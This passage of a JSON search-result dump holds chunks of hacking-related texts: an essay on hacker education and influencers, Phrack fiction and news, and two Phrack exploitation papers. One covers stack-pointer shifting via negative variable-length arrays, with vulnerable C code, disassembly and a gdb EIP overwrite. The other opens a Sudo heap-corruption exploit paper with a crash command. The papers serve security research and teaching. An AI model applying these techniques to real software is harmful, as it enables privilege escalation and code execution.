censorship, because the underlying skill is very basic web development. So to me a phishing tutorial is kinda deceitful and unnecessarily hiding the real \"hacking\" skill - web development. But I know many of my peers disagree here. Then there is the evolution of \"hacker influencer\". It was important to me at the start to be faceless anonymous. But over the years my opinion has slightly changed. I often think back to the time when I was sitting alone in my room trying to understand an article, and wished I had the videos I make today. So for me it's important to use social media and their algorithmic feeds to maximize exposure; hoping to reach that kid who wants to break through the same wall I was hitting. Nowadays I believe that my desire to have this information easily discoverable, outweighs restricting educational resources to obscure (or underground) places. In 2019 TheCyberMentor joined the scene with live streaming basic pentesting lessons for free on Twitch[20]. It kinda felt like OSCP material, just in video form and free. There were earlier attempts at creating free pentesting courses, such as SecurityTube or Cybrary, and maybe others as well. But TheCyberMentor is undoubtedly the most successful one, reaching several millions of views. This hasn't lasted long though, since building up the initial audience, he transitioned away into paid courses too. There is also some criticism regarding original content vs. taking existing (written) tutorials and turning them into videos. Certainly there is added value in improved presentation. But there is also the ethical question about highlighting the sources. This especially affects newcomers where sometimes it's obvious that they follow a typical outline from other material, without referencing it. In the past years, there has also been an interesting development about topics covered by the video creator scene. Because it has been completely dominated by \"bug bounties\". As much as I love seeing an influx of motivated young people, it feels like this is our community's version of the \"get rich quick\" scam. It leads to a huge demand for paid courses and guides that directly or indirectly promise you to make you a successful bug hunter. Currently it's very rare to see content beyond bug bounties and I wish there was more diversity. Sometimes I also think about how hacking communities organize, and how creators changed this. In the past the communities were usually divided by topics of interest, and now the communities form around personalities. Sometimes this makes me a bit uncomfortable, but this also resulted in a massive increase in exposure to the hacking world (it benefits the creator when the fan base grows). It's always difficult to see cultural change, when it evolves away from what we grew up with. But thinking back to my teenage years, I wish I could have been able to find places like that more easily, instead of having to wait until my 20s to accidentally stumble into it. Besides creating videos, there is also a growing scene live streaming on Twitch. Most of them work on challenges from HackTheBox or TryHackMe, which are platforms with commercial interest. This means the streamers provide collectively free advertising worth millions for those platforms. On",
                      "hash": "7cb430787c4deac901e94b48e252bf5a74e2a6547095e580b1765a6de3ea9c22",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8155484795570374
                    }
                  ]
                },
                {
                  "created": 1679370933072,
                  "document_id": "phrack-62-16",
                  "timestamp": 1089676800000,
                  "tags": ["phrack", "issue-62", "article-16"],
                  "hash": "05583fb63cb64188ac42514e508a8f26a840330069c45103888f1687d6a38532",
                  "text_size": 86231,
                  "chunk_count": 6,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3e, Phile #0x10 of 0x10 |=-----------------------------------------------------------------------=| |=--------------------=[ W O R L D N E W S ]=--------------------------=| |=-----------------------------------------------------------------------=| 1 - Break, Memory, by Richard Thieme 2 - The Geometry of Near, by Richard Thieme 3 - The Feasibility of Anarchy in America, by Anthony *** QUICK NEWS quiCK NEWS QUICK NEWS QUICK NEWS QUICK NEWS QUICK NEWS *** - Windows source code leaked http://ww.kuro5hin.org/story/2004/2/15/71552/7795 http://www.wired.com/news/technology/0,1282,62282,00.html - grsecurity 'Spender' makes fun of OpenBSD and Mac OS X http://seclists.org/lists/fulldisclosure/2004/Jun/0647.html - These guys have all the books about terrorist/anarchy/combat/... http://www.paladin-press.com - 29A releases first worm that spreads via mobile network http://securityresponse.symantec.com/avcenter/venc/data/epoc.cabir.html |=-----------------------------------------------------------------------=| |=-----------------------------------------------------------------------=| |=-----------------------------------------------------------------------=| Break, Memory By Richard Thieme The Evolution of the Problem The problem was not that people couldn't remember; the problem was that people couldn't forget. As far back as the 20th century, we realized that socio-historical problems were best handled on a macro level. It was inefficient to work on individuals who were, after all, nothing but birds in digital cages. Move the cage, move the birds. The challenge was to build the cage big enough to create an illusion of freedom in flight but small enough to be moved easily. When long-term collective memory became a problem in the 21st century, it wound up on my desktop. There had always been a potential for individuals to connect the dots and cause a contextual shift. We managed the collective as best we could with Chomsky Chutes but an event could break out randomly at any time like a bubble bursting. As much as we surveil the social landscape with sensors and datamine for deep patterns, we can't catch everything. It's all sensors and statistics, after all, which have limits. If a phenomenon gets sticky or achieves critical mass, it can explode through any interface, even create the interface it needs at the moment of explosion. That can gum up the works. Remembering and forgetting changed after writing was invented. The ones that remembered best had always won. Writing shifted the advantage from those who knew to those who knew how to find what was known. Electronic communication shifted the advantage once again to those who knew what they didn't need to know but knew how to get it when they did. In the twentieth century advances in pharmacology and genetic engineering increased longevity dramatically and at the same time meaningful distinctions between backward and forward societies disappeared so far as health care was concerned. The population exploded everywhere simultaneously. People who had retired in their sixties could look forward to sixty or seventy more years of healthful living. As usual, the anticipated problems - overcrowding, scarce water and food, employment for those who wanted it - were not the big issues. Crowding was managed by staggered living, generating niches in many multiples of what used to be daylight single-sided life. Life became double- sided, then triple-sided, and so on. Like early memory storage devices that packed magnetic media inside other media, squeezing them into every bit of available space, we designed multiple niches in society that allowed people to live next to one another in densely packed communities without even noticing their neighbors. Oh, people were vaguely aware that thousands of others were on the streets or in stadiums, but they might as well have been simulants for all the difference they made. We call this the Second Neolithic, the emergence of specialization at the next level squared. The antisocial challenges posed by hackers who \"flipped\" through niches for weeks at a time, staying awake on Perkup, or criminals exploiting flaws inevitably present in any new system, were anticipated and handled using risk management algorithms. In short, multisided life works. Genetic engineering provided plenty of food and water. Binderhoff Day commemorates the day that water was recycled from sewage using the Binderhoff Method. A body barely relinquishes its liquid before it's back in a glass in its hand. As to food, the management of fads enables us to play musical chairs with agri-resources, smoothing the distribution curve. Lastly, people are easy to keep busy. Serial careers, marriages and identities have been pretty much standard since the twentieth century. Trends in that direction continued at incremental rather than tipping-point levels. We knew within statistical limits when too many transitions would cause a problem, jamming intersections as it were with too many vehicles, so we licensed relationships, work-terms, and personal reinvention using traffic management algorithms to control the social flow. By the twenty-first century, everybody's needs were met. Ninety-eight per cent of everything bought and sold was just plain made up. Once we started a fad, it tended to stay in motion, generating its own momentum. People spent much of their time exchanging goods and services that an objective observer might have thought useless or unnecessary, but of course, there was no such thing as an objective observer. Objectivity requires distance, historical perspective, exactly what is lacking. Every product or service introduced into the marketplace drags in its wake an army of workers to manufacture it, support it, or clean up after it which swells the stream until it becomes a river. All of those rivers flow into the sea but the sea is never full. Fantasy baseball is a good example. It had long been noticed that baseball itself, once the sport became digitized, was a simulation. Team names were made up for as many teams as the population would watch. Players for those teams were swapped back and forth so the team name was obviously arbitrary, requiring the projection of a \"team gestalt\" from loyal fans pretending not to notice that they booed players they had cheered as heroes the year before. Even when fans were physically present at games, the experience was mediated through digital filters; one watched or listened to digital simulations instead of the game itself, which existed increasingly on the edges of the field of perception. Then the baseball strike of 2012 triggered the Great Realization. The strike was on for forty-two days before anyone noticed the absence of flesh-and-blood players because the owners substituted players made of pixels. Game Boys created game boys. Fantasy baseball had invented itself in recognition that fans might as well swap virtual players and make up teams too but the G.R. took it to the next level. After the strike, Double Fantasy Baseball became an industry, nested like a Russian doll inside Original Fantasy Baseball. Leagues of fantasy players were swapped in meta-leagues of fantasy players. Then Triple Fantasy Baseball . Quadruple Fantasy Baseball . and now the fad is Twelves in baseball football and whack-it-ball and I understand that Lucky Thirteens is on the drawing boards, bigger and better than any of its predecessors. So no, there is no shortage of arbitrary activities or useless goods. EBay was the prototype of the future, turning the world into one gigantic swap meet. If we need a police action or a new professional sport to bleed off excess hostility or rebalance the body politic, we make it up. The Hump in the Bell Curve as we call the eighty per cent that buy and sell just about everything swim blissfully in the currents of make-believe digital rivers, all unassuming. They call it the Pursuit of Happiness. And hey - who are we to argue? The memory-longevity problem came as usual completely out of fantasy left field. People were living three, four, five generations, as we used to count generations, and vividly recalled the events of their personal histories. Pharmacological assists and genetic enhancement made the problem worse by quickening recall and ending dementia and Alzheimer's. I don't mean that every single person remembered every single thing but the Hump as a whole had pretty good recall of its collective history and that's what mattered. Peer-to-peer communication means one-knows-everyone-knows and that created problems for society in general and - as a Master of Society - that makes it my business. My name is Horicon Walsh, if you hadn't guessed, and I lead the team that designs the protocols of society. I am the man behind the Master. I am the Master behind the Plan. The Philosophical Basis of the Problem The philosophical touchstone of our efforts was defined in nineteenth century America. The only question that matters is, What good is it? Questions like, what is its nature? what is its end? are irrelevant. Take manic depression, for example. Four per cent of the naturally occurring population were manic depressive in the late twentieth century. The pharmacological fix applied to the anxious or depressive one-third of the Hump attempted to maintain a steady internal state, not too high and not too low. That standard of equilibrium was accepted without question as a benchmark for fixing manic depression. Once we got the chemistry right, the people who had swung between killing themselves and weeks of incredibly productive, often genius-level activity were tamped down in the bowl, as it were, their glowing embers a mere reflection of the fire that had once burned so brightly. Evolution, in other words, had gotten it right because their good days - viewed from the top of the tent - made up for their bad days. Losing a few to suicide was no more consequential than a few soccer fans getting trampled. Believing that the Golden Mean worked on the individual as well as the macro level, we got it all wrong. That sort of mistake, fixing things according to unexamined assumptions, happened all the time when we started tweaking things. Too many dumb but athletic children spoiled the broth. Too many waddling bespectacled geeks made it too acrid. Too many willowy beauties made it too salty. Peaks and valleys, that's what we call the first half of the 21st century, as we let people design their own progeny. The feedback loops inside society kind of worked - we didn't kill ourselves - but clearly we needed to be more aware. Regulation was obviously necessary and subsequently all genetic alteration and pharmacological enhancements were cross-referenced in a matrix calibrated to the happiness of the Hump. Executing the Plan to make it all work was our responsibility, a charge that the ten per cent of us called Masters gladly accepted. The ten per cent destined to be dregs, spending their lives picking through dumpsters and arguing loudly with themselves in loopy monologues, serve as grim reminders of what humanity would be without our enlightened guidance. That's the context in which it became clear that everybody remembering everything was a problem. The Nostalgia Riots of Greater Florida were only a symptom. The Nostalgia Riots Here you had the fat tip of a long peninsular state packed like a water balloon with millions of people well into their hundreds. One third of the population was 150 or older by 2175. Some remembered sixteen major wars and dozens of skirmishes and police actions. Some had lived through forty-six recessions and recoveries. Some had lived through so many elections they could have written the scripts, that's how bad it was. Their thoughtful reflection, nuanced perspective, and appropriate skepticism were a blight on a well-managed global free-market democracy. They did not get depressed - pharmies in the food and water made sure of that - but they sure acted like depressed people even if they didn't feel like it. And depressed people tend to get angry. West Floridians lined benches from Key West through Tampa Bay all the way to the Panhandle. The view from satellites when they lighted matches one night in midwinter to demonstrate their power shows an unbroken arc along the edge of the water like a second beach beside the darker beach. All day every day they sat there remembering, comparing notes, measuring what was happening now by what had happened before. They put together pieces of the historical puzzle the way people used to do crosswords and we had to work overtime to stay a step ahead. The long view of the Elder Sub- Hump undermined satisfaction with the present. They preferred a different, less helpful way of looking at things. When the drums of the Department of System Integration, formerly the Managed Affairs and Perception Office, began to beat loudly to rouse the population of our crowded earth to a fury against the revolutionary Martian colonists who shot their resupplies into space rather than pay taxes to the earth, we thought we would have the support of the Elder Sub-Hump. Instead they pushed the drumming into the background and recalled through numerous conversations the details of past conflicts, creating a memory net that destabilized the official Net. Their case for why our effort was doomed was air-tight, but that wasn't the problem. We didn't mind the truth being out there so long as no one connected it to the present. The problem was that so many people knew it because the Elder Sub-Hump wouldn't shut up. That created a precedent and the precedent was the problem. Long-term memory, we realized, was subversive of the body politic. Where had we gotten off course? We had led the culture to skew toward youth because youth have no memory in essence, no context for judging anything. Their righteousness is in proportion to their ignorance, as it should be. But the Elder Sub-Hump skewed that skew. We launched a campaign against the seditious seniors. Because there were so many of them, we had to use ridicule. The three legs of the stool of cover and deception operations are illusion, misdirection, and ridicule, but the greatest of these is ridicule. When the enemy is in plain sight, you have to make him look absurd so everything he says is discredited. The UFO Campaign of the twentieth century is the textbook example of that strategy. You had fighter pilots, commercial pilots, credible citizens all reporting the same thing from all over the world, their reports agreeing over many decades in the small details. So ordinary citizens were subjected to ridicule. The use of government owned and influenced media like newspapers (including agency-owned-and-operated tabloids) and television networks made people afraid to say what they saw. They came to disbelieve their own eyes so the phenomena could hide in plain sight. Pretty soon no one saw it. Even people burned by close encounters refused to believe in their own experience and accepted official explanations. We did everything possible to make old people look ridiculous. Subtle images of drooling fools were inserted into news stories, short features showed ancients playing inanely with their pets, the testimony of confused seniors was routinely dismissed in courts of law. Our trump card - entertainment - celebrated youth and its lack of perspective, extoll",
                      "hash": "14fcda20ece59957c81add8f45bf7d9fd093c70f62692b8d3ffcac2583964ffd",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8151701092720032
                    }
                  ]
                },
                {
                  "created": 1679370959304,
                  "document_id": "phrack-63-14",
                  "timestamp": 1105142400000,
                  "tags": ["phrack", "issue-63", "article-14"],
                  "hash": "aa1fa4f032e85f4bdf20c8570879f1d442bfd04a15fdb7a9e75d4e5bbae5b1f5",
                  "text_size": 14835,
                  "chunk_count": 2,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3f, Phile #0x0e of 0x14 |=----=[ Clutching at straws: When you can shift the stack pointer ]=----=| |=-----------------------------------------------------------------------=| |=----------=[ Andrew Griffiths <andrewg@felinemenace.org> ]=------------=| --[ Table of contents 1 - Introduction 2 - The story 2.1 - C99 standard note 3 - Breakdown 4 - Moving on 4.1 - Requirements for exploitability 5 - Links 6 - Finishing up --[ 1 - Introduction The paper documents a rare, but none-the less interesting bug in variable sized arrays in C. This condition appears when a user supplied length is passed via a parameter to a variable declaration in a function. As a result of this, an attacker may be able to \"shift\" the stack pointer to point it to somewhere unexpected, such as above the stack pointer, or somewhere else like the Global Offset Table. --[ 2 - The story After playing a couple rounds of pool and drinking at a local pub, nemo talked about some of the fruits after the days auditing session. He mentioned that there was some interesting code constructs which he hadn't fully explored yet (perhaps because I dragged him out drinking). Basically, the code vaguely looked like: int function(int len, some_other_args) { int a; struct whatever *b; unsigned long c[len]; if(len > SOME_DEFINE) { return ERROR; } /* rest of the code */ } and we started discussing about that, and how we could take advantage of that. After various talks about the compiler emitting code that wouldn't allow it, architectures that it'd work on (and caveats of those architectures), and of course, another round or two drinks, we came to the conclusion that it'd be perfectly feasible to exploit, and it would be a standard esp -= user_supplied_value; The problem in the above code, is that if len is user-supplied it would be possible to make it negative, and move the stack pointer move closer to the top of the stack, as opposed to closer to the bottom (assuming the stack grows down.) ----[ 2.1 - C99 standard note The C99 standard allows for variable-length array declaration: To quote, \"In this example, the size of a variable-length array is computed and returned from a function: size_t fsize3 (int n) { char b[n+3]; //Variable length array. return sizeof b; // Execution timesizeof. } int main() { size_t size; size = fsize3(10); // fsize3 returns 13. return 0; }\" --[ 3 - Break down Here is the (convoluted) C file we'll be using as an example. We'll cover more things later on in the article. #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> #include <sys/types.h> int func(int len, char *stuff) { char x[len]; printf(\"sizeof(x): %d\\n\", sizeof(x)); strncpy(x, stuff, 4); return 58; } int main(int argc, char **argv) { return func(atoi(argv[1]), argv[2]); } The question arises though, what instructions does the compiler generate for the func function? Here is the resulting disassembly from \"gcc version 3.3.5 (Debian 1:3.3.5-8ubuntu2)\", gcc dmeiswrong.c -o dmeiswrong. 080483f4 <func>: 80483f4: 55 push %ebp 80483f5: 89 e5 mov %esp,%ebp ; standard function ; prologue 80483f7: 56 push %esi 80483f8: 53 push %ebx ; preserve the appropriate ; register contents. 80483f9: 83 ec 10 sub $0x10,%esp ; setup local ; variables 80483fc: 89 e6 mov %esp,%esi ; preserve the esp ; register 80483fe: 8b 55 08 mov 0x8(%ebp),%edx ; get the length 8048401: 4a dec %edx ; decrement it 8048402: 8d 42 01 lea 0x1(%edx),%eax ; eax = edx + 1 8048405: 83 c0 0f add $0xf,%eax 8048408: c1 e8 04 shr $0x4,%eax 804840b: c1 e0 04 shl $0x4,%eax The last three lines are eax = (((eax + 15) >> 4) << 4); This rounds up and aligns eax to a paragraph boundary. 804840e: 29 c4 sub %eax,%esp ; adjust esp 8048410: 8d 5c 24 0c lea 0xc(%esp),%ebx ; ebx = esp + 12 8048414: 8d 42 01 lea 0x1(%edx),%eax ; eax = edx + 1 8048417: 89 44 24 04 mov %eax,0x4(%esp) ; len argument 804841b: c7 04 24 78 85 04 08 movl $0x8048578,(%esp) ; fmt string ; \"sizeof(x): %d\\n\" 8048422: e8 d9 fe ff ff call 8048300 <_init+0x3c> ; printf 8048427: c7 44 24 08 04 00 00 movl $0x4,0x8(%esp) ; len arg to 804842e: 00 ; strncpy 804842f: 8b 45 0c mov 0xc(%ebp),%eax 8048432: 89 44 24 04 mov %eax,0x4(%esp) ; data to copy 8048436: 89 1c 24 mov %ebx,(%esp) ; where to write ; ebx = adjusted esp + 12 (see 0x8048410) 8048439: e8 e2 fe ff ff call 8048320 <_init+0x5c> ; strncpy 804843e: 89 f4 mov %esi,%esp ; restore esp 8048440: b8 3a 00 00 00 mov $0x3a,%eax ; ready to return 58 8048445: 8d 65 f8 lea 0xfffffff8(%ebp),%esp ; we restore esp again, just in case it ; didn't happen in the first place. 8048448: 5b pop %ebx 8048449: 5e pop %esi 804844a: 5d pop %ebp 804844b: c3 ret ; restore registers and return. What can we learn from the above assembly output? 1) There is some rounding done on the supplied value, thus meaning small negative values (-15 > -1) and small values (1 - 15) will become 0. This might possibly be useful, as we'll see below. When the supplied value is -16 or less, then it will be possible to move the stack pointer backwards (closer to the top of the stack). The instruction sub $eax, %esp at 0x804840e can be seen as add $16, %esp when len is -16.[1] 2) The stack pointer is subtracted by the paragraph-aligned supplied value. Since we can supply an almost arbitary value to this, we can point the stack pointer at a specified paragraph. If the stack pointer value is known, we can calcuate the offset needed to point the stack at that location in memory. This allows us to modify writable sections such as the GOT and heap. 3) gcc can output some wierd assembly constructs. --[ 4 - Moving on So what does the stack diagram look like in this case? When we reach 0x804840e (sub esp, eax) this is how it looks. +------------+ 0xc0000000 | ...... | Top of stack. | ...... | 0xbffff86c | 0x08048482 | Return address 0xbffff868 | 0xbffff878 | Saved EBP 0xbffff864 | ...... | Saved ESI 0xbffff860 | ...... | Saved EBX 0xbffff85c | ...... | Local variable space 0xbffff858 | ...... | Local variable space 0xbffff854 | ...... | Local variable space 0xbffff850 +------------+ ESP To overwrite the saved return address, we need to calculate what to make it subtract by. delta = 0xbffff86c - 0xbffff850 delta = 28 We need to subtract 12 from our delta value because of the instruction at 0x08048410 (lea 0xc(%esp),%ebx) so we end up with 16. If the adjusted delta was less than 16 we would end up overwriting 0xbffff85c, due to the paragraph alignment. Depending what is in that memory location denotes how useful it is. In this particular case its not. If we could write more than 4 bytes, it could be useful. When we set -16 AAAA as the arguments to dmeiswrong, we get: andrewg@supernova:~/papers/straws$ gdb -q ./dmeiswrong Using host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\". (gdb) set args -16 AAAA (gdb) r Starting program: /home/andrewg/papers/straws/dmeiswrong -16 AAAA sizeof(x): -16 Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () Based with the above information, an exploit can be written for dmeiswrong.c. See the attached file iyndwacyndwm.c for more information. The attached exploit code (iyndwacyndwm.c) works on my system (gcc version: Debian 1:3.3.5-8ubuntu2, kernel: Linux supernova 2.6.10-5-686 #1 Fri Jun 24 17:33:34 UTC 2005 i686 GNU/Linux) with success. It may fail on the readers machine due to different initial stack layout, and different compiler options / generated code. You may need to play a bit with gdb a bit to get it working. However, this technique should work fine for other people, they may just need to play around a bit to get it working as expected. To get it working for your system, have a look at what causes a segfault (this can be achieved with a simple \"for i in `seq 0 -4 -128` ; do ./dmeiswrong $i AAAA ; done\" loop and seeing if the offset segfaults. The attached Makefile implements this loop for you when you type make bf. You can then replay the offset and args in GDB to see if EIP is pointing to 0x41414141. Then its a matter of getting the stack layout correct for so the exploit will run. In the included exploit, I've made it so it tries to determine the exact offset to where the shellcode starts. This technique is further explained in [2]. Otherwise, this technique could be done via examining the heap layout at \"_start\" (entry point of the executable) and looking at what is in memory from the top, and seeing the offset, as its quite possible that things have been moved around during different kernel releases. In order to make it easier for people to play around with this technique, I've included a precompiled dmeiswrong and iyndwacyndwm files, which hopefully demonstate the problem. If iyndwacyndwm does not work for you, try iyndwacyndwm-lame which tries the standard \"pick an offset from some value (like esp)\" technique to try and gain code execution on the host. I haven't performed a wide scale test against vulnerable compilers, but due to the code construct compilers would be most likely to emit, I suspect a majority of compilers which support variable sized stack arrays to be vulnerable. Thos which wouldn't be vulnerable would be those which include code to verify if this is not a problem during runtime. Exploitability of this type of bug appears to be feasible on other architectures, such as PPC, as I was able to get it to crash with $pc being something not of my choice. (such as, 0x6f662878, and sometimes $pc would be pointing at an invalid instruction on the stack). This was done via just incrementing the value passed as the len by 4 in a loop. Make bf should point out the exploitable architectures as they should crash (eventually.) I didn't have enough time to look into this further as the time to submit the final paper drew to close, and PPC assembly and MacOSX are not my strongest skills. --[ 4.1 - Requirements for exploitability In order for an architecture / Operating System to be exploitable, the architecture needs to support having a stack which can be moved about. If the stack contains embedded flow control information, such as saved return addresses, it makes it significantly easier to exploit, and partially less dependant on what value the stack pointer contains. This in turn increases reliability in exploits, especially remote ones. Additionally, the compiler needs to: - support variable sized stack arrays (which as demonstrated above, is a feature of the C99 standard) - not emit code that performs sanity checking of the changed stack pointer. It is forseeable that if this issue gets a lot of public attention, that various compiler security patches (such as pro-police, stackguard, so fourth) will add detection of this issue. The direction the stack grows is not that relevant to the problem, as if the x86 stack grew upwards, the instruction at 0x804840e, would be written as addl %eax, %esp, and given the parameter len as -16 would could be rewritten as subl $16, %esp, which would allow access to the saved eip and saved frame pointer, amongst other things. The attached Makefile has a \"bf\" option",
                      "hash": "58fbbd72c4d375f85284c67783578f7c4b0438dcd8820980de2f63482075ce7b",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8137189745903015
                    }
                  ]
                },
                {
                  "created": 1679370797323,
                  "document_id": "phrack-57-8",
                  "timestamp": 997488000000,
                  "tags": ["phrack", "issue-57", "article-8"],
                  "hash": "e6856dcbc34caf705311fb29d10ba20460a5964efd7d1698b822dac6cdababa2",
                  "text_size": 120796,
                  "chunk_count": 10,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x39, Phile #0x08 of 0x12 --=[ Disclaimer ]=-----------------------------------------------------// In this issue of Phrack, there are two similar articles about malloc based exploitation techniques. The first one explains in detail the GNU C Library implementation of the malloc interface and how it can be abused to exploit buffer overflows in malloc space. The second article is a more hands-on approach to introduce you to the idea of malloc overflows. It covers the System V implementation and the GNU C Library implementation. If you are not sure about the topic, it may be a better choice to start with it to get an idea of the subject. However, if you are serious about learning this technique, there is no way around the article by MaXX. --=[ Enjoy ]=------------------------------------------------------------// |=[ Vudo - An object superstitiously believed to embody magical powers ]=-| |=-----------------------------------------------------------------------=| |=------------=[ Michel \"MaXX\" Kaempf <maxx@synnergy.net> ]=-------------=| |=---------------[ Copyright (C) 2001 Synnergy Networks ]=---------------=| The present paper could probably have been entitled \"Smashing The Heap For Fun And Profit\"... indeed, the memory allocator used by the GNU C Library (Doug Lea's Malloc) and the associated heap corruption techniques are presented. However, it was entitled \"Vudo - An object superstitiously believed to embody magical powers\" since a recent Sudo vulnerability and the associated Vudo exploit are presented as well. --[ Contents ]---------------------------------------------------------- 1 - Introduction 2 - The \"potential security problem\" 2.1 - A real problem 2.1.1 - The vulnerable function 2.1.2 - The segmentation violation 2.2 - An unreal exploit 2.3 - Corrupting the heap 2.4 - Temporary conclusion 3 - Doug Lea's Malloc 3.1 - A memory allocator 3.1.1 - Goals 3.1.2 - Algorithms 3.1.2.1 - Boundary tags 3.1.2.2 - Binning 3.1.2.3 - Locality preservation 3.1.2.4 - Wilderness preservation 3.1.2.5 - Memory mapping 3.2 - Chunks of memory 3.2.1 - Synopsis of public routines 3.2.2 - Vital statistics 3.2.3 - Available chunks 3.3 - Boundary tags 3.3.1 - Structure 3.3.2 - Size of a chunk 3.3.3 - prev_size field 3.3.4 - size field 3.4 - Bins 3.4.1 - Indexing into bins 3.4.2 - Linking chunks in bin lists 3.5 - Main public routines 3.5.1 - The malloc(3) algorithm 3.5.2 - The free(3) algorithm 3.5.3 - The realloc(3) algorithm 3.6 - Execution of arbitrary code 3.6.1 - The unlink() technique 3.6.1.1 - Concept 3.6.1.2 - Proof of concept 3.6.2 - The frontlink() technique 3.6.2.1 - Concept 3.6.2.2 - Proof of concept 4 - Exploiting the Sudo vulnerability 4.1 - The theory 4.2 - The practice 5 - Acknowledgements 6 - Outroduction --[ 1 - Introduction ]-------------------------------------------------- Sudo (superuser do) allows a system administrator to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while logging the commands and arguments. -- http://www.courtesan.com/sudo/index.html On February 19, 2001, Sudo version 1.6.3p6 was released: \"This fixes a potential security problem. So far, the bug does not appear to be exploitable.\" Despite the comments sent to various security mailing lists after the announce of the new Sudo version, the bug is not a buffer overflow and the bug does not damage the stack. But the bug is exploitable: even a single byte located somewhere in the heap, erroneously overwritten by a NUL byte before a call to syslog(3) and immediately restored after the syslog(3) call, may actually lead to execution of arbitrary code as root. Kick off your shoes, put your feet up, lean back and just enjoy the... voodoo. The present paper focuses on Linux/Intel systems and: - details the aforementioned bug and explains why a precise knowledge of how malloc works internally is needed in order to exploit it; - describes the functioning of the memory allocator used by the GNU C Library (Doug Lea's Malloc), from the attacker's point of view; - applies this information to the Sudo bug, and presents a working exploit for Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1. --[ 2 - The \"potential security problem\" ]------------------------------ ----[ 2.1 - A real problem ]-------------------------------------------- ------[ 2.1.1 - The vulnerable function ]------------------------------- The vulnerable function, do_syslog(), can be found in the logging.c file of the Sudo tarball. It is called by two other functions, log_auth() and log_error(), in order to syslog allow/deny and error messages. If the message is longer than MAXSYSLOGLEN (960) characters, do_syslog() splits it into parts, breaking up the line into what will fit on one syslog line (at most MAXSYSLOGLEN characters) and trying to break on a word boundary if possible (words are delimited by SPACE characters here). /* * Log a message to syslog, pre-pending the username and splitting the * message into parts if it is longer than MAXSYSLOGLEN. */ static void do_syslog( int pri, char * msg ) { int count; char * p; char * tmp; char save; /* * Log the full line, breaking into multiple syslog(3) calls if * necessary */ [1] for ( p=msg, count=0; count < strlen(msg)/MAXSYSLOGLEN + 1; count++ ) { [2] if ( strlen(p) > MAXSYSLOGLEN ) { /* * Break up the line into what will fit on one syslog(3) line * Try to break on a word boundary if possible. */ [3] for ( tmp = p + MAXSYSLOGLEN; tmp > p && *tmp != ' '; tmp-- ) ; if ( tmp <= p ) [4] tmp = p + MAXSYSLOGLEN; /* NULL terminate line, but save the char to restore later */ save = *tmp; [5] *tmp = '\\0'; if ( count == 0 ) SYSLOG( pri, \"%8.8s : %s\", user_name, p ); else SYSLOG( pri,\"%8.8s : (command continued) %s\",user_name,p ); /* restore saved character */ [6] *tmp = save; /* Eliminate leading whitespace */ [7] for ( p = tmp; *p != ' '; p++ ) ; [8] } else { if ( count == 0 ) SYSLOG( pri, \"%8.8s : %s\", user_name, p ); else SYSLOG( pri,\"%8.8s : (command continued) %s\",user_name,p ); } } } ------[ 2.1.2 - The segmentation violation ]---------------------------- Chris Wilson discovered that long command line arguments cause Sudo to crash during the do_syslog() operation: $ /usr/bin/sudo /bin/false `/usr/bin/perl -e 'print \"A\" x 31337'` Password: maxx is not in the sudoers file. This incident will be reported. Segmentation fault Indeed, the loop[7] does not check for NUL characters and therefore pushes p way after the end of the NUL terminated character string msg (created by log_auth() or log_error() via easprintf(), a wrapper to vasprintf(3)). When p reaches the end of the heap (msg is of course located in the heap since vasprintf(3) relies on malloc(3) and realloc(3) to allocate dynamic memory) Sudo eventually dies on line[7] with a segmentation violation after an out of-bounds read operation. This segmentation fault occurs only when long command line arguments are passed to Sudo because the loop[7] has to be run many times in order to reach the end of the heap (there could indeed be many SPACE characters, which force do_syslog() to leave the loop[7], after the end of the msg buffer but before the end of the heap). Consequently, the length of the msg string has to be many times MAXSYSLOGLEN because the loop[1] runs as long as count does not reach (strlen(msg)/MAXSYSLOGLEN + 1). ----[ 2.2 - An unreal exploit ]----------------------------------------- Dying after an illegal read operation is one thing, being able to perform an illegal write operation in order to gain root privileges is another. Unfortunately do_syslog() alters the heap at two places only: line[5] and line[6]. If do_syslog() erroneously overwrites a character at line[5], it has to be exploited during one of the syslog(3) calls between line[5] and line[6], because the erroneously overwritten character is immediately restored at line[6]. Since msg was allocated in the heap via malloc(3) and realloc(3), there is an interesting structure stored just after the end of the msg buffer, maintained internally by malloc: a so-called boundary tag. If syslog(3) uses one of the malloc functions (calloc(3), malloc(3), free(3) or realloc(3)) and if the Sudo exploit corrupts that boundary tag during the execution of do_syslog(), evil things could happen. But does syslog(3) actually call malloc functions? $ /usr/bin/sudo /bin/false `/usr/bin/perl -e 'print \"A\" x 1337'` [...] malloc( 100 ): 0x08068120; malloc( 300 ): 0x08060de0; free( 0x08068120 ); malloc( 700 ): 0x08060f10; free( 0x08060de0 ); malloc( 1500 ): 0x080623b0; free( 0x08060f10 ); realloc( 0x080623b0, 1420 ): 0x080623b0; [...] malloc( 192 ): 0x08062940; malloc( 8192 ): 0x080681c8; realloc( 0x080681c8, 119 ): 0x080681c8; free( 0x08062940 ); free( 0x080681c8 ); [...] The first series of malloc calls was performed by log_auth() in order to allocate memory for the msg buffer, but the second series of malloc calls was performed... by syslog(3). Maybe the Sudo exploit is not that unreal after all. ----[ 2.3 - Corrupting the heap ]--------------------------------------- However, is it really possible to alter a given byte of the boundary tag located after the msg buffer (or more generally to overwrite at line[5] an arbitrary character (after the end of msg) with a NUL byte)? If the Sudo exploit exclusively relies on the content of the msg buffer (which is fortunately composed of various user-supplied strings (current working directory, sudo command, and so on)), the answer is no. This assertion is demonstrated below. The character overwritten at line[5] by a NUL byte is pointed to by tmp: - tmp comes from loop[3] if there is a SPACE character among the first MAXSYSLOGLEN bytes after p. tmp then points to the first SPACE character encountered when looping from (p + MAXSYSLOGLEN) down to p. -- If the overwritten SPACE character is located within the msg buffer, there is no heap corruption at all because the write operation is not an illegal one. -- If this first encountered SPACE character is located outside the msg buffer, the Sudo exploit cannot control its exact position if it solely relies on the content of the msg buffer, and thus cannot control where the NUL byte is written. - tmp 